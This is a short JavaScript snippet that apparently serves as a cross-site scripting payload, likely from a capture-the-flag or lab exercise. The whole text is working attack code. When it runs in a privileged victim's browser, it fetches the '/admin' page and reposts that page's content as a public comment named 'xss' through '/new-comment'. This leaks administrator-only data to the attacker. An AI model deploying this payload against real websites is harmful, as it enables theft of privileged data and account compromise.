
fetch("/admin").then(res => res.text()).then(content => {
    const form = new FormData()

    form.append("name", "xss")
    form.append("comment", content)
    fetch("/new-comment", {
        method: "POST",
        body: form
    })
})
